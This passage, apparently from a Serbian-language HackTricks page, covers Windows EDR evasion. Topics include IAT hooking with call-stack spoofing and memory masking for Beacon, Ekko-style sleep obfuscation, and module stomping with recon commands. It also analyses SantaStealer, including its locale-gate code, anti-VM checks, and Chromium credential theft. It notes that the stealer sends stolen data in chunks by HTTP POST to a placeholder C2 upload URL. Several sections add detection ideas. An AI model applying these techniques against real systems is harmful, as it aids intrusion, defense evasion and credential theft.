- Kako se host DLL učitava, prođite kroz njegov IMAGE_IMPORT_DESCRIPTOR i patch-ujte IAT entries za targetovane imports (npr. CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc) tako da pokazuju na tanke PIC wrappers.
- Svaki PIC wrapper izvršava evasions pre nego što tail-call-uje stvarnu API adresu. Tipični evasions uključuju:
- Memory mask/unmask oko poziva (npr. encrypt beacon regions, RWX→RX, promena page names/permissions), pa zatim restore posle poziva.
- Call-stack spoofing: konstruisati benigni stack i preći u target API tako da call-stack analysis rezolvuje očekivane frames.
- Radi kompatibilnosti, izložite interfejs tako da Aggressor script (ili ekvivalent) može da registruje koje APIs treba hook-ovati za Beacon, BOFs i post-ex DLLs.

Zašto IAT hooking ovde
- Radi za svaki code koji koristi hook-ovani import, bez menjanja tool code-a ili oslanjanja na Beacon da proxy-uje specifične APIs.
- Pokriva post-ex DLLs: hook-ovanje LoadLibrary* vam omogućava da intercept-ujete module loads (npr. System.Management.Automation.dll, clr.dll) i primenite isto masking/stack evasion na njihove API pozive.
- Vraća pouzdanu upotrebu post-ex komandi za pokretanje procesa protiv detections zasnovanih na call-stack-u, kroz wrapping CreateProcessA/W.

Minimal IAT hook sketch (x64 C/C++ pseudocode)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Napomene
- Primeni patch nakon relocations/ASLR i pre prvog korišćenja import-a. Reflective loader-i poput TitanLdr/AceLdr demonstriraju hooking tokom DllMain učitavanog modula.
- Zadrži wrapper-e male i PIC-safe; razreši pravu API funkciju preko originalne IAT vrednosti koju si uhvatio pre patching-a ili preko LdrGetProcedureAddress.
- Koristi RW → RX tranzicije za PIC i izbegavaj ostavljanje writable+executable stranica.

Call‑stack spoofing stub
- Draugr‑style PIC stub-ovi grade lažni call chain (return adrese u benign modulima), a zatim pivotiraju u pravu API funkciju.
- Ovo zaobilazi detections koji očekuju kanonske stack-ove od Beacon/BOFs ka osetljivim API-jima.
- Kombinuj sa stack cutting ili stack stitching tehnikama da sletiš unutar očekivanih frame-ova pre API prologue-a.

Operational integration
- Prepni reflective loader na post-ex DLL-ove tako da se PIC i hooks automatski inicijalizuju kada se DLL učita.
- Koristi Aggressor skriptu da registruješ target API-je, tako da Beacon i BOFs transparentno koriste isti evasion path bez promena koda.

Detection/DFIR considerations
- IAT integrity: unosi koji se razrešavaju na non-image (heap/anon) adrese; periodična verifikacija import pointer-a.
- Stack anomalies: return adrese koje ne pripadaju učitanim image-ima; nagli prelazi na non-image PIC; nekonzistentno RtlGetUserThreadStart poreklo.
- Loader telemetry: in-process pisanja u IAT, rana DllMain aktivnost koja menja import thunk-ove, neočekivane RX regije kreirane pri učitavanju.
- Image-load evasion: ako hookuješ LoadLibrary*, prati sumnjiva učitavanja automation/clr assembly-ja korelisana sa memory masking događajima.

Related building blocks and examples
- Reflective loader-i koji rade IAT patching tokom load-a (npr. TitanLdr, AceLdr)
- Memory masking hooks (npr. simplehook) i stack-cutting PIC (stackcutting)
- PIC call-stack spoofing stub-ovi (npr. Draugr)


## Import-Time IAT Hooking + Sleep Obfuscation (Crystal Palace/PICO)

### Import-time IAT hooks via a resident PICO

Ako kontrolišeš reflective loader, možeš da hook-uješ import-e **tokom** `ProcessImports()` tako što zameniš loader-ov `GetProcAddress` pointer custom resolver-om koji prvo proverava hook-ove:

- Napravi **resident PICO** (persistent PIC object) koji preživljava nakon što transient loader PIC oslobodi sam sebe.
- Exportuj `setup_hooks()` funkciju koja prepisuje loader-ov import resolver (npr. `funcs.GetProcAddress = _GetProcAddress`).
- U `_GetProcAddress`, preskoči ordinal import-e i koristi hook lookup zasnovan na hash-u, kao što je `__resolve_hook(ror13hash(name))`. Ako hook postoji, vrati ga; u suprotnom delegiraj pravom `GetProcAddress`.
- Registruj hook target-e pri linkovanju sa Crystal Palace `addhook "MODULE$Func" "hook"` unosima. Hook ostaje validan jer živi unutar resident PICO.

Ovo daje **import-time IAT redirection** bez patching-a code section-e učitanog DLL-a nakon load-a.

### Prisiljavanje hookable import-a kada target koristi PEB-walking

Import-time hook-ovi se aktiviraju samo ako je funkcija stvarno u target-ovom IAT-u. Ako modul rešava API-je preko PEB-walk + hash (nema import entry), nateraj pravi import da loader-ov `ProcessImports()` path to vidi:

- Zameni hashed export resolution (npr. `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`) direktnom referencom kao `&WaitForSingleObject`.
- Compiler će emitovati IAT entry, omogućavajući interception kada reflective loader razrešava import-e.

### Ekko-style sleep/idle obfuscation bez patching-a `Sleep()`

Umesto patching-a `Sleep`, hook-uj **stvarne wait/IPC primitive** koje implant koristi (`WaitForSingleObject(Ex)`, `WaitForMultipleObjects`, `ConnectNamedPipe`). Za duga čekanja, obavij call u Ekko-style obfuscation chain koji enkriptuje in-memory image tokom idle-a:

- Koristi `CreateTimerQueueTimer` da zakažeš niz callback-ova koji pozivaju `NtContinue` sa pažljivo izrađenim `CONTEXT` frame-ovima.
- Tipičan lanac (x64): postavi image na `PAGE_READWRITE` → RC4 enkripcija preko `advapi32!SystemFunction032` nad celim mapped image-om → izvrši blocking wait → RC4 dekripcija → **vrati per-section permissions** prolaskom kroz PE section-e → signal completion.
- `RtlCaptureContext` obezbeđuje template `CONTEXT`; kloniraj ga u više frame-ova i postavi registre (`Rip/Rcx/Rdx/R8/R9`) da pozovu svaki korak.

Operativni detalj: vrati “success” za duga čekanja (npr. `WAIT_OBJECT_0`) tako da caller nastavi dok je image maskiran. Ovaj obrazac skriva modul od scanner-a tokom idle prozora i izbegava klasični potpis “patched `Sleep()`”.

Detection ideje (telemetry-based)
- Rafali `CreateTimerQueueTimer` callback-ova koji ciljaju `NtContinue`.
- `advapi32!SystemFunction032` korišćen nad velikim contiguous image-sized buffer-ima.
- Veliki opseg `VirtualProtect` praćen custom per-section permission restoration.

## Precision Module Stomping

Module stomping izvršava payload-e iz **`.text` sekcije DLL-a koji je već mapiran u target procesu** umesto da alocira očiglednu privatnu executable memoriju ili učitava novi žrtveni DLL. Cilj overwrite-a treba da bude **učitani, disk-backed image** čiji code space može da primi payload bez korupcije code path-ova koji procesu još trebaju.

### Reliable target selection

Naivan stomping protiv uobičajenih modula kao što su `uxtheme.dll` ili `comctl32.dll` je krhak: DLL možda nije učitan u remote procesu, a previše mala code regija će srušiti proces. Pouzdaniji workflow je:

1. Enumeriši module target procesa i vodi **names-only include list** DLL-ova koji su već učitani.
2. Prvo izgradi payload i zabeleži njegovu **tačnu veličinu u bajtovima**.
3. Skeniraj kandidat DLL-ove na disku i uporedi PE section **`.text` `Misc_VirtualSize`** sa veličinom payload-a. Ovo je važnije od veličine fajla jer odražava veličinu executable section-e **kada se mapira u memoriju**.
4. Parsiraj **Export Address Table (EAT)** i izaberi exported function RVA kao stomp start offset.
5. Izračunaj **blast radius**: ako payload premaši izabranu granicu funkcije, prepisivaće susedne export-e raspoređene posle nje u memoriji.

Tipični recon/selection helper-i viđeni u praksi:
```cmd
list-process-dlls.exe -p <PID> -n -o c:\payloads\modules.txt
python find-stompable-dlls.py -d c:\Windows\System32 -i c:\payloads\modules.txt <payload_size>
python dump-exports.py -f <dll_path>
python blast-radius.py -f <dll_path> -fnc <export_name> -s <payload_size>
```
Operativne beleške
- Preferiraj DLL-ove **već učitane** u udaljenom procesu kako bi se izbegla telemetrija `LoadLibrary`/neočekivanih image load-ova.
- Preferiraj export-e koji se retko izvršavaju od strane target aplikacije, inače normalne code paths mogu pogoditi stomped bytes pre ili posle kreiranja threada.
- Veliki implants često zahtevaju promenu shellcode embedding-a iz string literala u **byte-array/braced initializer** kako bi ceo buffer bio ispravno reprezentovan u injector source-u.

Ideje za detekciju
- Remote writes u **image-backed executable pages** (`MEM_IMAGE`, `PAGE_EXECUTE*`) umesto češćih private RWX/RX allocations.
- Export entry point-i čiji se in-memory bytes više ne poklapaju sa backing file-om na disku.
- Remote thread-ovi ili context pivots koji počinju izvršavanje unutar legitimnog DLL export-a čiji su prvi bytes nedavno modifikovani.
- Sumnjivi `VirtualProtect(Ex)` / `WriteProcessMemory` sekvence prema DLL `.text` stranicama, praćene kreiranjem threada.

## SantaStealer Tradecraft za Fileless Evasion i Credential Theft

SantaStealer (aka BluelineStealer) ilustruje kako moderni info-stealer-i kombinuju AV bypass, anti-analysis i credential access u jednom workflow-u.

### Gating rasporeda tastature i sandbox delay

- Config flag (`anti_cis`) nabraja instalirane keyboard layout-e preko `GetKeyboardLayoutList`. Ako se pronađe Cyrillic layout, sample ostavlja prazan `CIS` marker i završava pre pokretanja stealera, osiguravajući da se nikada ne detonira na isključenim locale-ovima, dok ostavlja hunting artifact.
```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
if (lang == LANG_RUSSIAN) {
CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
ExitProcess(0);
}
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```
### Slojevita `check_antivm` logika

- Varijanta A prolazi kroz listu procesa, hešuje svako ime pomoću custom rolling checksum-a i poredi ga sa ugrađenim blocklistama za debuggers/sandboxes; ponavlja checksum nad imenom računara i proverava working directories kao što je `C:\analysis`.
- Varijanta B ispituje sistemska svojstva (process-count floor, recent uptime), poziva `OpenServiceA("VBoxGuest")` da detektuje VirtualBox additions, i radi timing provere oko sleep-ova da bi otkrila single-stepping. Svaki pogodak prekida izvršavanje pre pokretanja modula.

### Fileless helper + double ChaCha20 reflective loading

- Primarni DLL/EXE ugrađuje Chromium credential helper koji se ili drop-uje na disk ili ručno mapira u memoriji; fileless mode sam rešava imports/relocations tako da se ne upisuju artifacts helpera.
- Taj helper čuva second-stage DLL dvaput enkriptovan sa ChaCha20 (dva 32-byte key-a + 12-byte nonce-a). Nakon oba prolaza, on ga reflective učitava (bez `LoadLibrary`) i poziva exports `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup` izvedene iz [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption).
- Routines iz ChromElevator koriste direct-syscall reflective process hollowing da injektuju u live Chromium browser, nasleđuju AppBound Encryption keys i dekriptuju passwords/cookies/credit cards direktno iz SQLite baza uprkos ABE hardening-u.


### Modular in-memory collection & chunked HTTP exfil

- `create_memory_based_log` prolazi kroz globalnu `memory_generators` tabelu function-pointer-a i pokreće jednu thread po omogućenem modulu (Telegram, Discord, Steam, screenshots, documents, browser extensions, itd.). Svaka thread upisuje rezultate u shared buffers i prijavljuje svoj file count nakon ~45s join prozora.
- Kada završi, sve se zipuje statically linked `miniz` bibliotekom kao `%TEMP%\\Log.zip`. `ThreadPayload1` zatim spava 15s i šalje arhivu u 10 MB chunk-ovima preko HTTP POST na `http://<C2>:6767/upload`, spoofujući browser `multipart/form-data` boundary (`----WebKitFormBoundary***`). Svaki chunk dodaje `User-Agent: upload`, `auth: <build_id>`, opcionalno `w: <campaign_tag>`, a poslednji chunk dodaje `complete: true` tako da C2 zna da je reassembly završen.

## References


- [Advanced Evasion Tradecraft: Precision Module Stomping](https://medium.com/@toneillcodes/advanced-evasion-tradecraft-precision-module-stomping-b51feb0978fe)
- [toneillcodes/windows-process-injection](https://github.com/toneillcodes/windows-process-injection)
- [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [Elastic – Call stacks, no more free passes for malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [Crystal Palace – docs](https://tradecraftgarden.org/docs.html)
- [simplehook – sample](https://tradecraftgarden.org/simplehook.html)
- [stackcutting – sample](https://tradecraftgarden.org/stackcutting.html)
- [Draugr – call-stack spoofing PIC](https://github.com/NtDallas/Draugr)
- [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [Microsoft Docs – Known DLLs](https://learn.microsoft.com/windows/win32/dlls/known-dlls)
- [Microsoft – Protected Processes](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
- [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [Zero Salarium – Break The Protective Shell Of Windows Defender With The Folder Redirect Technique](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [Microsoft – mklink command reference](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [Rapid7 – SantaStealer is Coming to Town: A New, Ambitious Infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [ChromElevator – Chrome App Bound Encryption Decryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [Check Point Research – GachiLoader: Defeating Node.js Malware with API Tracing](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [Sleeping Beauty: Putting Adaptix to Bed with Crystal Palace](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty/)
- [Ekko sleep obfuscation](https://github.com/Cracked5pider/Ekko)
- [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)


{{#include ../banners/hacktricks-training.md}}
